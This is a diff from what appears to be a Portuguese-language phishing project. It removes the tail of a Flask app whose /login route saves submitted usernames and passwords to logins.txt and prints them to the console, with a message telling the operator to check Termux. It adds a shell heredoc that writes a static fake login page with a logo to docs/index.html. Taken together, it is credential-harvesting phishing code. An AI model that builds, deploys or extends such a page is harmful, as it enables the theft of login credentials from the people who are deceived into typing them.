@@ -1,27 +1,52 @@
+cat > docs/index.html << 'EOF'
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login</title>
+<style>
+body {
+    font-family: Arial;
+    background: #f0f2f5;
+}
+.login-box {
+    width: 300px;
+    margin: 80px auto;
+    background: #fff;
+    padding: 20px;
+    text-align: center;
+    border-radius: 10px;
+}
+img {
+    width: 100px;
+    margin-bottom: 20px;
+}
+input {
+    width: 90%;
+    padding: 10px;
+    margin: 8px;
+}
+button {
+    width: 95%;
+    padding: 10px;
+    background: #007BFF;
+    color: white;
+    border: none;
+}
+</style>
+</head>
+<body>
+
+<div class="login-box">
+    <img src="static/mnvc3.png">
+    <form>
+        <input type="text" placeholder="Usuário">
+        <input type="password" placeholder="Senha">
+        <button>Entrar</button>
+    </form>
+</div>
+
+</body>
 </html>
-"""
-
-@app.route('/')
-def index():
-    return render_template_string(html)
-
-@app.route('/logo')
-def logo():
-    # Busca a imagem dentro da pasta static
-    with open("static/images.png", "rb") as f:
-        return f.read(), 200, {'Content-Type': 'image/png'}
-
-@app.route('/login', methods=['POST'])
-def login():
-    user = request.form.get('user')
-    password = request.form.get('pass')
-
-    with open("logins.txt", "a") as f:
-        f.write(f"Usuário: {user} | Senha: {password}\n")
-
-    print(f"[LOGIN] Usuário: {user} | Senha: {password}")
-
-    return "<h3>Dados enviados! Verifique o Termux.</h3>"
-
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000)
+EOF
